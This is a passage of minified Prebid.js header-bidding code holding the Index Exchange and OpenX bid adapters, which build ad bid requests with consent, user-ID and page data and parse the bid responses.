            iu: 0,
            nu: 0,
            ou: 0,
            allu: 0,
            ren: !1,
            version: "6.10.0-pre",
            userIds: H(e[0])
          }, n = function (n) {
            if (o = e.filter(function (e) {
              return e.transactionId === r[n];
            })[0], Object(i.deepAccess)(o, "mediaTypes")) {
              if (Object.keys(o.mediaTypes).length > 1 && t.mfu++, Object(i.deepAccess)(o, "mediaTypes.native") && t.nu++, Object(i.deepAccess)(o, "mediaTypes.banner") && t.bu++, "outstream" === Object(i.deepAccess)(o, "mediaTypes.video.context")) {
                t.ou++;
                var a = "object" === v(Object(i.deepAccess)(o, "renderer") || Object(i.deepAccess)(o, "mediaTypes.video.renderer"));
                t.ren = t.ren && a ? Object(i.deepAccess)(t, "ren") : a;
              }
              "instream" === Object(i.deepAccess)(o, "mediaTypes.video.context") && t.iu++, t.allu++;
            }
          }, a = 0; a < r.length; a++) {
          var o;
          n(a);
        }
        return t;
      }(e);
      for (var f in b) m.ext.ixdiag[f] = b[f];
      var y = function () {
        if (!L.localStorageIsEnabled()) return;
        var e,
          r = {};
        try {
          e = JSON.parse(L.getDataFromLocalStorage(F) || "{}");
        } catch (e) {
          return Object(i.logError)("ix can not read ixdiag from localStorage."), null;
        }
        return Object.keys(e).forEach(function (t) {
          Object.keys(e[t]).forEach(function (i) {
            "number" == typeof e[t][i] && (r[i] = r[i] ? r[i] + e[t][i] : e[t][i]);
          });
        }), r;
      }();
      if (Object(i.isEmpty)(y) || (m.ext.ixdiag.err = y), e[0].schain && (m.source = {
        ext: {
          schain: e[0].schain
        }
      }), c.length > 0 && (m.user = {}, m.user.eids = c), document.referrer && "" !== document.referrer && (m.site.ref = document.referrer), r) {
        if (r.gdprConsent) {
          var g = r.gdprConsent;
          g.hasOwnProperty("gdprApplies") && (m.regs = {
            ext: {
              gdpr: g.gdprApplies ? 1 : 0
            }
          }), g.hasOwnProperty("consentString") && (m.user = m.user || {}, m.user.ext = {
            consent: g.consentString || ""
          }, g.hasOwnProperty("addtlConsent") && g.addtlConsent && (m.user.ext.consented_providers_settings = {
            consented_providers: g.addtlConsent
          }));
        }
        r.uspConsent && Object(i.deepSetValue)(m, "regs.ext.us_privacy", r.uspConsent), r.refererInfo && (m.site.page = r.refererInfo.referer);
      }
      a.b.getConfig("coppa") && Object(i.deepSetValue)(m, "regs.coppa", 1);
      var h = {};
      h.s = e[0].params.siteId, h.v = o, h.ac = "j", h.sd = 1, 8.1 === o && (h.nf = 1);
      var j = r && r.bidderCode || "ix",
        A = a.b.getConfig(j),
        S = [],
        _ = 0,
        P = Object.keys(t),
        T = "".concat(s).concat(Object(i.parseQueryStringParameters)(I(I({}, h), {}, {
          r: JSON.stringify(m)
        }))).length;
      if (T > D) return Object(i.logError)("IX Bid Adapter: Base request size has exceeded maximum request size.", {
        bidder: E,
        code: z.EXCEEDS_MAX_SIZE
      }), S;
      var C = T,
        X = 0,
        k = !1;
      if (A) {
        if ("object" === v(A.firstPartyData)) {
          var B = A.firstPartyData,
            U = "?";
          for (var V in B) B.hasOwnProperty(V) && (U += "".concat(encodeURIComponent(V), "=").concat(encodeURIComponent(B[V]), "&"));
          U = U.slice(0, -1), (X = encodeURIComponent(U).length) < D ? ("page" in m.site ? m.site.page += U : m.site.page = U, C += X) : Object(i.logError)("IX Bid Adapter: IX config FPD request size has exceeded maximum request size.", {
            bidder: E,
            code: z.IX_FPD_EXCEEDS_MAX_SIZE
          });
        }
        "number" == typeof A.timeout && (h.t = A.timeout), "boolean" == typeof A.detectMissingSizes ? m.ext.ixdiag.dms = A.detectMissingSizes : m.ext.ixdiag.dms = !0;
      }
      for (var M = function (r) {
          if (C >= D || S.length >= 4) return "break";
          for (var o = t[P[r]], d = o.missingCount, c = void 0 === d ? 0 : d, p = o.missingImps, u = void 0 === p ? [] : p, l = o.ixImps, b = !1, f = D - C, y = {
              ixImps: void 0 === l ? [] : l,
              missingBannerImpressions: u
            }, g = Object.keys(y).map(function (e) {
              return y[e];
            }).filter(function (e) {
              return Array.isArray(e);
            }).reduce(function (e, r) {
              return e.concat.apply(e, O(r));
            }, []), v = encodeURIComponent(JSON.stringify({
              impressionObjects: g
            })).length; g.length && v > f;) b = !0, g.pop(), v = encodeURIComponent(JSON.stringify({
            impressionObjects: g
          })).length;
          if (g.length && n.b in g[0]) {
            var j = g[0],
              x = j.id,
              A = j.banner.topframe,
              w = j.ext,
              N = t[P[r]].gpid,
              X = {
                id: x,
                banner: {
                  topframe: A,
                  format: g.map(function (e) {
                    var r = e.banner;
                    return {
                      w: r.w,
                      h: r.h,
                      ext: e.ext
                    };
                  })
                }
              };
            (w.dfp_ad_unit_code || N) && (X.ext = {}, X.ext.dfp_ad_unit_code = w.dfp_ad_unit_code, X.ext.gpid = N), "bidfloor" in g[0] && (X.bidfloor = g[0].bidfloor), "bidfloorcur" in g[0] && (X.bidfloorcur = g[0].bidfloorcur), m.imp.push(X), m.ext.ixdiag.msd += c, m.ext.ixdiag.msi += u.length;
          } else {
            var B;
            (B = m.imp).push.apply(B, O(g));
          }
          C += v;
          var F = a.b.getConfig("ortb2") || {};
          if (!Object(i.isEmpty)(F) && !k) {
            m.ext.ixdiag.fpd = !0;
            var U = I({}, F.site || F.context);
            Object.keys(U).forEach(function (e) {
              -1 === R.SITE.indexOf(e) && delete U[e];
            });
            var L = I({}, F.user);
            Object.keys(L).forEach(function (e) {
              -1 === R.USER.indexOf(e) && delete L[e];
            });
            var V = Object(i.deepClone)(m);
            if (V.site = Object(i.mergeDeep)({}, V.site, U), V.user = Object(i.mergeDeep)({}, V.user, L), "".concat(s).concat(Object(i.parseQueryStringParameters)(I(I({}, h), {}, {
              r: JSON.stringify(V)
            }))).length < D) {
              m.site = Object(i.mergeDeep)({}, m.site, U), m.user = Object(i.mergeDeep)({}, m.user, L), k = !0;
              var M = encodeURIComponent(JSON.stringify(I(I({}, U), L))).length;
              C += M;
            } else Object(i.logError)("IX Bid Adapter: FPD request size has exceeded maximum request size.", {
              bidder: E,
              code: z.PB_FPD_EXCEEDS_MAX_SIZE
            });
          }
          var q = r === P.length - 1;
          if (b || q) {
            var J = Object(i.deepClone)(h);
            q && !_ || (m.ext.ixdiag.sn = _, J.sn = _), _++, J.r = JSON.stringify(m), S.push({
              method: "GET",
              url: s,
              data: J,
              validBidRequests: e
            }), C = T, m.imp = [], m.ext.ixdiag.msd = 0, m.ext.ixdiag.msi = 0, k = !1;
          }
        }, q = 0; q < P.length; q++) {
        if ("break" === M(q)) break;
      }
      return S;
    }
    function H(e) {
      var r = e.userId || {};
      return X.filter(function (e) {
        return r[e];
      });
    }
    function K(e, r) {
      if (r) for (var t = 0; t < e.length; t++) {
        var i = e[t];
        if (r[0] === i[0] && r[1] === i[1]) {
          e.splice(t, 1);
          break;
        }
      }
    }
    function ee(e, r) {
      var t = function (e) {
        var r = M(e),
          t = Object(i.deepAccess)(e, "mediaTypes.video"),
          a = Object(i.deepAccess)(e, "params.video");
        if (G(t, a).length) return {};
        for (var o in r.video = a ? Object(i.deepClone)(e.params.video) : {}, t) -1 === B.indexOf(o) || r.video.hasOwnProperty(o) || (r.video[o] = t[o]);
        if (r.video.minduration > r.video.maxduration) return Object(i.logError)("IX Bid Adapter: video minduration [".concat(r.video.minduration, "] cannot be greater than video maxduration [").concat(r.video.maxduration, "]"), {
          bidder: E,
          code: z.VIDEO_DURATION_INVALID
        }), {};
        var s = a && a.context || t && t.context;
        if (s && !r.video.hasOwnProperty("placement") && (s === b.a ? r.video.placement = 1 : s === b.b ? r.video.placement = 4 : Object(i.logWarn)("IX Bid Adapter: Video context '".concat(s, "' is not supported"))), !r.video.w || !r.video.h) {
          var d = Y(Object(i.deepAccess)(r, "video.playerSize")) || Y(Object(i.deepAccess)(e, "params.size"));
          if (!d) return Object(i.logWarn)("IX Bid Adapter: Video size is missing in [mediaTypes.video] missing"), {};
          r.video.w = d[0], r.video.h = d[1], Object(i.deepAccess)(r, "ext.sid") || (r.ext.sid = Object(i.parseGPTSingleSizeArray)(d));
        }
        return q(e, r, n.d), r;
      }(e);
      0 != Object.keys(t).length && (r[e.transactionId] = {}, r[e.transactionId].ixImps = [], r[e.transactionId].ixImps.push(t));
    }
    function re(e, r, t) {
      var o = I(I({}, {
          detectMissingSizes: !0
        }), a.b.getConfig("ix")),
        s = function (e) {
          var r = M(e);
          r.banner = {};
          var t = Object(i.deepAccess)(e, "params.size");
          return t && (r.banner.w = t[0], r.banner.h = t[1], Object(i.deepAccess)(r, "ext.sid") || (r.ext.sid = Object(i.parseGPTSingleSizeArray)(t))), r.banner.topframe = Object(i.inIframe)() ? 0 : 1, q(e, r, n.b), r;
        }(e);
      W(Object(i.deepAccess)(e, "mediaTypes.banner.sizes"), Object(i.deepAccess)(e, "params.size")) && (t.hasOwnProperty(e.transactionId) || (t[e.transactionId] = {}), t[e.transactionId].hasOwnProperty("ixImps") || (t[e.transactionId].ixImps = []), t[e.transactionId].ixImps.push(s), t[e.transactionId].gpid = Object(i.deepAccess)(e, "ortb2Imp.ext.gpid")), o.hasOwnProperty("detectMissingSizes") && o.detectMissingSizes && function (e, r, t) {
        var n = e.transactionId;
        if (r.hasOwnProperty(n)) {
          var a = [];
          r[n].hasOwnProperty("missingSizes") && (a = r[n].missingSizes), K(a, e.params.size), r[n].missingSizes = a;
        } else if (Object(i.deepAccess)(e, "mediaTypes.banner.sizes")) {
          var o = Object(i.deepClone)(e.mediaTypes.banner.sizes);
          K(o, e.params.size);
          var s = {
            missingSizes: o,
            impression: t
          };
          r[n] = s;
        }
      }(e, r, s);
    }
    function te(e, r, t) {
      var a = Object(i.deepClone)(r);
      return a.ext.sid = Object(i.parseGPTSingleSizeArray)(t), a.banner.w = t[0], a.banner.h = t[1], q(e, a, n.b), a;
    }
    function ie(e) {
      if ("ERROR" === e.type && e.arguments && e.arguments[1] && e.arguments[1].bidder === E) {
        var r = {
          hasEnforcementHook: !1,
          valid: Object(i.hasDeviceAccess)()
        };
        Object(d.d)(10, E, r, function (r) {
          r.valid && function (e) {
            if (L.localStorageIsEnabled()) {
              var r;
              try {
                r = JSON.parse(L.getDataFromLocalStorage(F) || "{}");
              } catch (e) {
                Object(i.logWarn)("ix can not read ixdiag from localStorage.");
              }
              var t = new Date();
              if (Object.keys(r).map(function (e) {
                var i = new Date(e);
                i.setDate(i.getDate() + 7) - t < 0 && delete r[e];
              }), "ERROR" === e.type && e.arguments && e.arguments[1] && e.arguments[1].bidder === E) {
                var n = t.toISOString().slice(0, 10),
                  a = e.arguments[1].code;
                a && (r[n] = r[n] || {}, Number(r[n][a]) || (r[n][a] = 0), r[n][a]++);
              }
              L.setDataInLocalStorage(F, JSON.stringify(r));
            }
          }(e);
        });
      }
    }
    function ne(e) {
      e.renderer.push(function () {
        var r = {
          width: e.width,
          height: e.height,
          timeout: 3e3
        };
        e.vastXml ? window.IXOutstreamPlayer(e.vastXml, e.adUnitCode, r) : window.IXOutstreamPlayer(e.vastUrl, e.adUnitCode, r);
      });
    }
    function ae(e) {
      var r = g.a.install({
        id: e,
        url: "https://js-sec.indexww.com/htv/video-player.js",
        loaded: !1
      });
      try {
        r.setRender(ne);
      } catch (e) {
        Object(i.logWarn)("Prebid Error calling setRender on renderer", e);
      }
      return r;
    }
    var oe = {
      code: E,
      gvlid: 10,
      aliases: [{
        code: w,
        gvlid: 10,
        skipPbsAliasing: !1
      }],
      supportedMediaTypes: _,
      isBidRequestValid: function (e) {
        U || (p.a.on(s.a.EVENTS.AUCTION_DEBUG, ie), p.a.on(s.a.EVENTS.AD_RENDER_FAILED, ie), U = !0);
        var r,
          t,
          n = Object(i.deepAccess)(e, "params.video"),
          a = Object(i.deepAccess)(e, "params.size"),
          o = Object(i.deepAccess)(e, "mediaTypes.banner.sizes"),
          d = Object(i.deepAccess)(e, "mediaTypes.video"),
          c = Object(i.deepAccess)(e, "mediaTypes.video.playerSize"),
          u = e.params.hasOwnProperty("bidFloor"),
          l = e.params.hasOwnProperty("bidFloorCur");
        if (e.hasOwnProperty("mediaType") && !Object(i.contains)(_, e.mediaType)) return Object(i.logWarn)("IX Bid Adapter: media type is not supported."), !1;
        if (Object(i.deepAccess)(e, "mediaTypes.banner") && !o) return !1;
        if (a) {
          var m = Y(a);
          if (!m) return Object(i.logError)("IX Bid Adapter: size has invalid format.", {
            bidder: E,
            code: z.BID_SIZE_INVALID_FORMAT
          }), !1;
          if (!W(e.sizes, m) && !W(c, m) && !W(o, m)) return Object(i.logError)("IX Bid Adapter: bid size is not included in ad unit sizes or player size.", {
            bidder: E,
            code: z.BID_SIZE_NOT_INCLUDED
          }), !1;
        }
        if ("string" != typeof e.params.siteId && "number" != typeof e.params.siteId) return Object(i.logError)("IX Bid Adapter: siteId must be string or number type.", {
          bidder: E,
          code: z.SITE_ID_INVALID_VALUE
        }), !1;
        if ("string" != typeof e.params.siteId && isNaN(Number(e.params.siteId))) return Object(i.logError)("IX Bid Adapter: siteId must valid value", {
          bidder: E,
          code: z.SITE_ID_INVALID_VALUE
        }), !1;
        if ((u || l) && !(u && l && (r = e.params.bidFloor, t = e.params.bidFloorCur, Boolean("number" == typeof r && "string" == typeof t && t.match(/^[A-Z]{3}$/))))) return Object(i.logError)("IX Bid Adapter: bidFloor / bidFloorCur parameter has invalid format.", {
          bidder: E,
          code: z.BID_FLOOR_INVALID_FORMAT
        }), !1;
        if (d && n) {
          var b = G(d, n);
          if (b.length) return b.forEach(function (e) {
            Object(i.logError)(e, {
              bidder: E,
              code: z.PROPERTY_NOT_INCLUDED
            });
          }), !1;
        }
        return !0;
      },
      buildRequests: function (e, r) {
        var t = [],
          a = {},
          o = {},
          s = {},
          d = {};
        for (var c in e.forEach(function (e) {
          var r = Object.keys(Object(i.deepAccess)(e, "mediaTypes", {}));
          switch (function (e) {
            return Object(i.deepAccess)(e, "params.video") && Object(i.deepAccess)(e, "mediaTypes.video") ? n.d : n.b;
          }(e)) {
            case n.b:
              re(e, d, a);
              break;
            case n.d:
              ee(e, o);
          }
          y()(r, n.b) && y()(r, n.d) && (s[e.transactionId] = e);
        }), Object.keys(s).forEach(function (e) {
          var r = s[e];
          a[e] || re(r, d, a), o[e] || ee(r, o);
        }), d) if (d.hasOwnProperty(c)) {
          var p = d[c].missingSizes;
          a.hasOwnProperty(c) || (a[c] = {}), a[c].hasOwnProperty("missingImps") || (a[c].missingImps = [], a[c].missingCount = 0);
          for (var u = d[c].impression, l = 0; l < p.length; l++) {
            var m = te(e[0], u, p[l]);
            a[c].missingImps.push(m), a[c].missingCount++;
          }
        }
        return Object.keys(a).length > 0 && t.push.apply(t, O($(e, r, a, 7.2))), Object.keys(o).length > 0 && t.push.apply(t, O($(e, r, o, 8.1))), t;
      },
      interpretResponse: function (e, r) {
        var t = [],
          n = null;
        if (!e.hasOwnProperty("body") || !e.body.hasOwnProperty("seatbid")) return t;
        for (var a = e.body, o = a.seatbid, s = 0; s < o.length; s++) if (o[s].hasOwnProperty("bid")) {
          for (var d = o[s].bid, c = JSON.parse(r.data.r), p = 0; p < d.length; p++) {
            var u = Q(d[p].impid, c.imp, r.validBidRequests);
            n = J(d[p], a.cur, u), Object(i.deepAccess)(n, "mediaTypes.video.renderer") || "outstream" !== Object(i.deepAccess)(n, "mediaTypes.video.context") || (n.mediaTypes.video.renderer = ae(d[p].bidId)), t.push(n);
          }
          if (Object(i.deepAccess)(c, "ext.ixdiag.err") && L.localStorageIsEnabled()) try {
            L.removeDataFromLocalStorage(F);
          } catch (e) {
            Object(i.logError)("ix can not clear ixdiag from localStorage.");
          }
        }
        return t;
      },
      transformBidParams: function (e, r) {
        return Object(i.convertTypes)({
          siteID: "number"
        }, e);
      },
      getUserSyncs: function (e, r) {
        return e.iframeEnabled ? [{
          type: "iframe",
          url: "https://js-sec.indexww.com/um/ixmatch.html"
        }] : [];
      }
    };
    Object(m.registerBidder)(oe), window.pbjs.installedModules.push("ixBidAdapter");
  }
}, [442]);
pbjsChunk([188], {
  566: function (e, t, n) {
    e.exports = n(567);
  },
  567: function (e, t, n) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    }), n.d(t, "USER_ID_CODE_TO_QUERY_ARG", function () {
      return b;
    }), n.d(t, "spec", function () {
      return f;
    });
    var r = n(0),
      a = n(3),
      i = n(1),
      o = n(2),
      d = n(12),
      c = n.n(d);
    function s(e) {
      return (s = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
        return typeof e;
      } : function (e) {
        return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
      })(e);
    }
    function u(e, t) {
      return function (e) {
        if (Array.isArray(e)) return e;
      }(e) || function (e, t) {
        var n = null == e ? null : "undefined" != typeof Symbol && e[Symbol.iterator] || e["@@iterator"];
        if (null == n) return;
        var r,
          a,
          i = [],
          o = !0,
          d = !1;
        try {
          for (n = n.call(e); !(o = (r = n.next()).done) && (i.push(r.value), !t || i.length !== t); o = !0);
        } catch (e) {
          d = !0, a = e;
        } finally {
          try {
            o || null == n.return || n.return();
          } finally {
            if (d) throw a;
          }
        }
        return i;
      }(e, t) || function (e, t) {
        if (!e) return;
        if ("string" == typeof e) return p(e, t);
        var n = Object.prototype.toString.call(e).slice(8, -1);
        "Object" === n && e.constructor && (n = e.constructor.name);
        if ("Map" === n || "Set" === n) return Array.from(e);
        if ("Arguments" === n || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)) return p(e, t);
      }(e, t) || function () {
        throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
      }();
    }
    function p(e, t) {
      (null == t || t > e.length) && (t = e.length);
      for (var n = 0, r = new Array(t); n < t; n++) r[n] = e[n];
      return r;
    }
    var m = [o.b, o.d],
      l = ["startdelay", "mimes", "minduration", "maxduration", "startdelay", "skippable", "playbackmethod", "api", "protocols", "boxingallowed", "linearity", "delivery", "protocol", "placement", "minbitrate", "maxbitrate"],
      b = {
        britepoolid: "britepoolid",
        criteoId: "criteoid",
        fabrickId: "nuestarid",
        haloId: "audigentid",
        id5id: "id5id",
        idl_env: "lre",
        IDP: "zeotapid",
        idxId: "idxid",
        intentIqId: "intentiqid",
        lipb: "lipbid",
        lotamePanoramaId: "lotameid",
        merkleId: "merkleid",
        netId: "netid",
        parrableId: "parrableid",
        pubcid: "pubcid",
        quantcastId: "quantcastid",
        tapadId: "tapadid",
        tdid: "ttduuid",
        uid2: "uid2",
        flocId: "floc",
        admixerId: "admixerid",
        deepintentId: "deepintentid",
        dmdId: "dmdid",
        nextrollId: "nextrollid",
        novatiq: "novatiqid",
        mwOpenLinkId: "mwopenlinkid",
        dapId: "dapid",
        amxId: "amxid",
        kpuid: "kpuid",
        publinkId: "publinkid",
        naveggId: "naveggid",
        imuid: "imuid",
        adtelligentId: "adtelligentid"
      },
      f = {
        code: "openx",
        gvlid: 69,
        supportedMediaTypes: m,
        isBidRequestValid: function (e) {
          var t = e.params.delDomain || e.params.platform;
          return Object(r.deepAccess)(e, "mediaTypes.banner") && t ? !!e.params.unit || Object(r.deepAccess)(e, "mediaTypes.banner.sizes.length") > 0 : !(!e.params.unit || !t);
        },
        buildRequests: function (e, t) {
          if (0 === e.length) return [];
          var n = [],
            i = u(function (e) {
              return e.reduce(function (e, t) {
                var n;
                return n = t, Object(r.deepAccess)(n, "mediaTypes.video") && !Object(r.deepAccess)(n, "mediaTypes.banner") || n.mediaType === o.d ? e[0].push(t) : e[1].push(t), e;
              }, [[], []]);
            }(e), 2),
            d = i[0],
            s = i[1];
          return s.length > 0 && n.push(function (e, t) {
            var n = [],
              i = !1,
              d = v(e, t),
              c = Object(r._map)(e, function (e) {
                return e.params.unit;
              });
            d.aus = Object(r._map)(e, function (e) {
              return Object(r.parseSizesInput)(e.mediaTypes.banner.sizes).join(",");
            }).join("|"), d.divids = Object(r._map)(e, function (e) {
              return encodeURIComponent(e.adUnitCode);
            }).join(","), d.aucs = Object(r._map)(e, function (e) {
              var t = Object(r.deepAccess)(e, "ortb2Imp.ext.data.pbadslot");
              return encodeURIComponent(t || "");
            }).join(","), c.some(function (e) {
              return e;
            }) && (d.auid = c.join(","));
            e.some(function (e) {
              return e.params.doNotTrack;
            }) && (d.ns = 1);
            (!0 === a.b.getConfig("coppa") || e.some(function (e) {
              return e.params.coppa;
            })) && (d.tfcd = 1);
            e.forEach(function (e) {
              if (e.params.customParams) {
                var t = Object(r._map)(Object.keys(e.params.customParams), function (t) {
                    return function (e, t) {
                      var n = t[e];
                      Object(r.isArray)(n) && (n = n.join(","));
                      return (e.toLowerCase() + "=" + n.toLowerCase()).replace("+", ".").replace("/", "_");
                    }(t, e.params.customParams);
                  }),
                  a = window.btoa(t.join("&"));
                i = !0, n.push(a);
              } else n.push("");
            }), i && (d.tps = n.join(","));
            return g(d, o.b, e), {
              method: "GET",
              url: d.ph ? "https://u.openx.net/w/1.0/arj" : "https://".concat(e[0].params.delDomain, "/w/1.0/arj"),
              data: d,
              payload: {
                bids: e,
                startTime: new Date()
              }
            };
          }(s, t)), d.length > 0 && d.forEach(function (e) {
            n.push(function (e, t) {
              var n = function (e, t) {
                var n,
                  a,
                  i = Object(r.deepAccess)(e, "mediaTypes.video"),
                  d = v([e], t),
                  s = Object(r.deepAccess)(e, "params.video") || {},
                  u = Object(r.deepAccess)(e, "mediaTypes.video.context"),
                  p = Object(r.deepAccess)(e, "mediaTypes.video.playerSize");
                Object(r.isArray)(e.sizes) && 2 === e.sizes.length && !Object(r.isArray)(e.sizes[0]) ? (n = parseInt(e.sizes[0], 10), a = parseInt(e.sizes[1], 10)) : Object(r.isArray)(e.sizes) && Object(r.isArray)(e.sizes[0]) && 2 === e.sizes[0].length ? (n = parseInt(e.sizes[0][0], 10), a = parseInt(e.sizes[0][1], 10)) : Object(r.isArray)(p) && 2 === p.length && (n = parseInt(p[0], 10), a = parseInt(p[1], 10));
                var m = {
                    w: n,
                    h: a
                  },
                  b = e.params.video || e.params.openrtb || {};
                b.openrtb && (b = b.openrtb);
                Object(r.isArray)(b.imp) && (b = b.imp[0].video);
                Object.keys(b).filter(function (e) {
                  return c()(l, e);
                }).forEach(function (e) {
                  return m[e] = b[e];
                }), Object.keys(i).filter(function (e) {
                  return c()(l, e);
                }).forEach(function (e) {
                  return m[e] = i[e];
                });
                var f = {
                  imp: [{
                    video: m
                  }]
                };
                d.openrtb = JSON.stringify(f), d.auid = e.params.unit, d.vwd = n || s.vwd, d.vht = a || s.vht, "outstream" === u && (d.vos = "101");
                s.mimes && (d.vmimes = s.mimes);
                e.params.test && (d.vtest = 1);
                var h = Object(r.deepAccess)(e, "ortb2Imp.ext.data.pbadslot");
                h && (d.aucs = encodeURIComponent(h));
                return g(d, o.d, [e]), d;
              }(e, t);
              return {
                method: "GET",
                url: n.ph ? "https://u.openx.net/v/1.0/avjp" : "https://".concat(e.params.delDomain, "/v/1.0/avjp"),
                data: n,
                payload: {
                  bid: e,
                  startTime: new Date()
                }
              };
            }(e, t));
          }), n;
        },
        interpretResponse: function (e, t) {
          var n = e.body;
          return function (e) {
            return /avjp$/.test(e.url) ? o.d : o.b;
          }(t) === o.d ? function (e, t) {
            var n = t.bid,
              a = (t.startTime, []);
            if (void 0 !== e && "" !== e.vastUrl && e.pub_rev > 0) {
              var i = Object(r.parseUrl)(e.vastUrl).search || {},
                d = {};
              d.requestId = n.bidId, e.deal_id && (d.dealId = e.deal_id), d.ttl = 300, d.netRevenue = !0, d.currency = e.currency, d.cpm = parseInt(e.pub_rev, 10) / 1e3, d.width = parseInt(e.width, 10), d.height = parseInt(e.height, 10), d.creativeId = e.adid, d.vastUrl = e.vastUrl, d.mediaType = o.d, e.ph = i.ph, e.colo = i.colo, e.ts = i.ts, a.push(d);
            }
            return a;
          }(n, t.payload) : function (e, t) {
            for (var n = t.bids, r = (t.startTime, e.ads.ad), a = [], i = 0; i < r.length; i++) {
              var o = r[i],
                d = parseInt(o.idx, 10),
                c = {};
              if (c.requestId = n[d].bidId, o.pub_rev) {
                c.cpm = Number(o.pub_rev) / 1e3;
                var s = o.creative[0];
                s && (c.width = s.width, c.height = s.height), c.creativeId = s.id, c.ad = o.html, o.deal_id && (c.dealId = o.deal_id), c.ttl = 300, c.netRevenue = !0, c.currency = o.currency, o.tbd && (c.tbd = o.tbd), c.ts = o.ts, c.meta = {}, o.brand_id && (c.meta.brandId = o.brand_id), o.adomain && length(o.adomain) > 0 ? c.meta.advertiserDomains = o.adomain : c.meta.advertiserDomains = [], o.adv_id && (c.meta.dspid = o.adv_id), a.push(c);
              }
            }
            return a;
          }(n, t.payload);
        },
        getUserSyncs: function (e, t, n, a) {
          if (e.iframeEnabled || e.pixelEnabled) return [{
            type: e.iframeEnabled ? "iframe" : "image",
            url: Object(r.deepAccess)(t, "0.body.ads.pixels") || Object(r.deepAccess)(t, "0.body.pixels") || function (e, t) {
              var n = "https://u.openx.net/w/1.0/pd",
                r = [];
              e && (r.push("gdpr=" + (e.gdprApplies ? 1 : 0)), r.push("gdpr_consent=" + encodeURIComponent(e.consentString || "")));
              t && r.push("us_privacy=" + encodeURIComponent(t));
              return "".concat(n).concat(r.length > 0 ? "?" + r.join("&") : "");
            }(n, a)
          }];
        },
        transformBidParams: function (e, t) {
          return Object(r.convertTypes)({
            unit: "string",
            customFloor: "number"
          }, e);
        }
      };
    function h(e) {
      var t,
        n,
        r,
        a = window,
        i = document,
        o = i.documentElement;
      if (e) {
        try {
          a = window.top, i = window.top.document;
        } catch (e) {
          return;
        }
        o = i.documentElement, r = i.body, t = a.innerWidth || o.clientWidth || r.clientWidth, n = a.innerHeight || o.clientHeight || r.clientHeight;
      } else o = i.documentElement, t = a.innerWidth || o.clientWidth, n = a.innerHeight || o.clientHeight;
      return "".concat(t, "x").concat(n);
    }
    function v(e, t) {
      var n,
        i = Object(r.inIframe)();
      n = {
        ju: a.b.getConfig("pageUrl") || t.refererInfo.referer,
        ch: document.charSet || document.characterSet,
        res: "".concat(screen.width, "x").concat(screen.height, "x").concat(screen.colorDepth),
        ifr: i,
        tz: new Date().getTimezoneOffset(),
        tws: h(i),
        be: 1,
        bc: e[0].params.bc || "".concat("hb_pb", "_").concat("3.0.3"),
        dddid: Object(r._map)(e, function (e) {
          return e.transactionId;
        }).join(","),
        nocache: new Date().getTime()
      };
      var o = y("ortb2.user.data");
      o.length > 0 && (n.sm = o);
      var d,
        c,
        s,
        u,
        p,
        m = y("ortb2.site.content.data");
      if (m.length > 0 && (n.scsm = m), e[0].params.platform && (n.ph = e[0].params.platform), t.gdprConsent) {
        var l = t.gdprConsent;
        void 0 !== l.consentString && (n.gdpr_consent = l.consentString), void 0 !== l.gdprApplies && (n.gdpr = l.gdprApplies ? 1 : 0), "iab" === a.b.getConfig("consentManagement.cmpApi") && (n.x_gdpr_f = 1);
      }
      return t && t.uspConsent && (n.us_privacy = t.uspConsent), Object(r.deepAccess)(e[0], "crumbs.pubcid") && Object(r.deepSetValue)(e[0], "userId.pubcid", Object(r.deepAccess)(e[0], "crumbs.pubcid")), d = n, c = e[0].userId, Object(r._each)(c, function (e, t) {
        var n = b[t];
        if (b.hasOwnProperty(t)) switch (t) {
          case "merkleId":
          case "flocId":
          case "uid2":
            d[n] = e.id;
            break;
          case "lipb":
            if (d[n] = e.lipbid, Array.isArray(e.segments) && e.segments.length > 0) {
              var r = "liveintent:" + e.segments.join("|");
              d.sm = "".concat(d.sm ? d.sm + "," : "").concat(r);
            }
            break;
          case "parrableId":
            d[n] = e.eid;
            break;
          case "id5id":
            d[n] = e.uid;
            break;
          case "novatiq":
            d[n] = e.snowflake;
            break;
          default:
            d[n] = e;
        }
      }), n = d, e[0].schain && (n.schain = (s = e[0].schain, "".concat(s.ver, ",").concat(s.complete, "!").concat((u = s.nodes, p = ["asi", "sid", "hp", "rid", "name", "domain"], u.map(function (e) {
        return p.map(function (t) {
          return e[t] || "";
        }).join(",");
      }).join("!"))))), n;
    }
    function y(e) {
      var t = a.b.getConfig(e);
      if (!Array.isArray(t) || !t.length) return "";
      var n = t.filter(function (e) {
        return Array.isArray(e.segment) && e.segment.length > 0 && void 0 !== e.name && e.name.length > 0;
      }).reduce(function (e, t) {
        var n = "object" === s(t.ext) && t.ext.segtax ? "".concat(t.name, "/").concat(t.ext.segtax) : t.name;
        return e[n] = (e[n] || []).concat(t.segment.map(function (e) {
          return e.id;
        })), e;
      }, {});
      return Object.keys(n).map(function (e, t) {
        return e + ":" + n[e].join("|");
      }).join(",");
    }
    function g(e, t, n) {
      var r = [],
        i = !1;
      n.forEach(function (e) {
        var n = function (e, t) {
          var n = {},
            r = a.b.getConfig("currency.adServerCurrency") || "USD";
          "function" == typeof e.getFloor && (n = e.getFloor({
            currency: r,
            mediaType: t,
            size: "*"
          }));
          var i = n.floor || e.params.customFloor || 0;
          return Math.round(1e3 * i);
        }(e, t);
        n ? (r.push(n), i = !0) : r.push(0);
      }), i && (e.aumfs = r.join(","));
    }
    Object(i.registerBidder)(f), window.pbjs.installedModules.push("openxBidAdapter");
  }
}, [566]);
pbjsChunk([169], {
  613: function (e, r, t) {
    e.exports = t(614);
  },
  614: function (e, r, t) {
    "use strict";

    Object.defineProperty(r, "__esModule", {
      value: !0
    }), r.checkVideoPlacement = _, t.d(r, "spec", function () {
      return X;
    });
    var a = t(0),
      i = t(1),
      n = t(2),
      s = t(3),
      o = t(13);
    function d() {
      return (d = Object.assign || function (e) {
        for (var r = 1; r < arguments.length; r++) {
          var t = arguments[r];
          for (var a in t) Object.prototype.hasOwnProperty.call(t, a) && (e[a] = t[a]);
        }
        return e;
      }).apply(this, arguments);
    }
    function c(e, r) {
      var t = Object.keys(e);
      if (Object.getOwnPropertySymbols) {
